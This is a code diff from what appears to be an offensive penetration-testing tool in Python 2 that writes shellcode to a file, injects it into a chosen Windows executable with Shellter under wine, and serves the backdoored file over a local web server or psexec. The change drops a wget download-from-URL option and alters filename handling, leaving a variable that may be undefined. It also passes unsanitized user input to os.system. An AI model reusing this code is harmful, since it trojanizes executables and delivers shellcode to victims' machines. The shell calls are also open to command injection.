@@ -415,7 +415,7 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
     if want_to_payloadinexe.lower() == 'y':
         payloadinexe_payloadname = raw_input(
-            '[*] EXE Filepath or URL to EXE: ')
+            '[*] EXE Filepath: ')
         os.chdir(os.getcwd() + '/shellter')
         try:
             os.mkdir('compiled')
@@ -424,21 +424,18 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
         with open('payloadbin', 'wb') as Csave:
             Csave.write(shellcode)
             Csave.close()
-        if re.search('http', payloadinexe_payloadname):
-            os.system('wget %s' % payloadinexe_payloadname)
-            payloadinexe_payloadname = re.search(
-                '(\w*.exe)', payloadinexe_payloadname)
-            payloadinexe_payloadname = payloadinexe_payloadname.group(1)
+            payloadinexe_payloadnameshort = re.search(
+                '\w+\.exe$', payloadinexe_payloadname)
         os.system('wine shellter.exe -a -f %s -s -p payloadbin ' %
                   payloadinexe_payloadname)
         os.system('mv %s ./compiled/%s' %
-                  (payloadinexe_payloadname, payloadinexe_payloadname))
+                  (payloadinexe_payloadname, payloadinexe_payloadnameshort.group(0)))
 
     want_to_upload = raw_input(
         '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
     if want_to_upload.lower() == 'y' or want_to_upload == '':
         if want_to_payloadinexe == 'y' and want_to_upload.lower() == 'y' or want_to_payloadinexe == 'y' and want_to_upload.lower() == '':
-            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadinexe_payloadname) + t.normal
+            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadinexe_payloadnameshort.group(0)) + t.normal
             a = multiprocessing.Process(
                 target=ServePayload, args=(os.getcwd() + '/compiled',))
             a.daemon = True
